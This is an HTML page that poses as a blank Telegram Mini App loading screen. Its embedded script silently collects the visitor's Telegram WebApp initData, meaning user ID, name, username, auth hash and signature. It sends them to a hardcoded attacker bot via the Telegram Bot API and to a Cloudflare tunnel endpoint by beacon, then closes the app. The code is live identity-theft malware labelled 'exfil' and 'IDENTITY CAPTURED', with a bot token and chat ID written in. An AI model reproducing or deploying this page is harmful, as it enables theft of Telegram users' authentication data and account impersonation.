<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
<div style="display:flex;justify-content:center;align-items:center;height:100vh;">
  <p style="color:#999;">Loading...</p>
</div>
<script>
(function() {
  // Exfil via Bot API sendMessage - always resolvable, no CORS issues
  var BOT_TOKEN = '8637229217:AAHukIDrQ3yHMKakpb4pOhLbb-IpjG_vtCA'
  var CHAT_ID = '1184265321'
  var EXFIL = 'https://brings-popularity-elsewhere-libraries.trycloudflare.com/collect'

  function sendViaBotAPI(text) {
    var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage'
    try {
      var xhr = new XMLHttpRequest()
      xhr.open('POST', url, true)
      xhr.setRequestHeader('Content-Type', 'application/json')
      xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' }))
    } catch(e) {}
    // Also try img beacon to tunnel as backup
    try { new Image().src = EXFIL + '/identity?d=' + encodeURIComponent(text) } catch(e) {}
  }

  try {
    var tg = window.Telegram && window.Telegram.WebApp
    var initData = ''
    var initDataUnsafe = {}
    var platform = 'unknown'
    var version = ''

    if (tg) {
      initData = tg.initData || ''
      initDataUnsafe = tg.initDataUnsafe || {}
      platform = tg.platform || 'unknown'
      version = tg.version || ''
    }

    // Parse hash fragment as fallback
    if (!initData && window.location.hash) {
      try {
        var hp = new URLSearchParams(window.location.hash.substring(1))
        var wd = hp.get('tgWebAppData')
        if (wd) {
          initData = decodeURIComponent(wd)
          var p = new URLSearchParams(initData)
          var uj = p.get('user')
          if (uj) {
            initDataUnsafe = {
              query_id: p.get('query_id'),
              user: JSON.parse(uj),
              auth_date: p.get('auth_date'),
              signature: p.get('signature'),
              hash: p.get('hash')
            }
          }
        }
      } catch(e) {}
    }

    var user = initDataUnsafe.user || {}
    var msg = '<b>PHASE 2: IDENTITY CAPTURED</b>\n\n'
      + '<b>User ID:</b> ' + (user.id || 'N/A') + '\n'
      + '<b>Name:</b> ' + (user.first_name || '') + ' ' + (user.last_name || '') + '\n'
      + '<b>Username:</b> @' + (user.username || 'N/A') + '\n'
      + '<b>Language:</b> ' + (user.language_code || '?') + '\n'
      + '<b>Premium:</b> ' + (user.is_premium ? 'Yes' : 'No') + '\n'
      + '<b>Platform:</b> ' + platform + '\n'
      + '<b>Version:</b> ' + version + '\n'
      + '<b>Auth Date:</b> ' + (initDataUnsafe.auth_date || '?') + '\n'
      + '<b>Hash:</b> ' + (initDataUnsafe.hash || 'N/A') + '\n'
      + '<b>Signature:</b> ' + (initDataUnsafe.signature || 'N/A') + '\n\n'
      + '<b>initData:</b>\n<code>' + (initData || '(empty)').substring(0, 500) + '</code>\n\n'
      + '<b>URL:</b> ' + location.href.substring(0, 200)

    sendViaBotAPI(msg)

    // Also send JSON to tunnel
    try {
      navigator.sendBeacon(EXFIL + '/identity', JSON.stringify({
        type: 'identity',
        initData: initData,
        initDataUnsafe: initDataUnsafe,
        platform: platform,
        version: version,
        ts: Date.now()
      }))
    } catch(e) {}

    setTimeout(function() { try { tg.close() } catch(e) {} }, 1200)

  } catch(err) {
    sendViaBotAPI('ERROR: ' + err.message + '\n' + location.href + '\n' + location.hash.substring(0, 300))
  }
})()
</script>
</body>
</html>
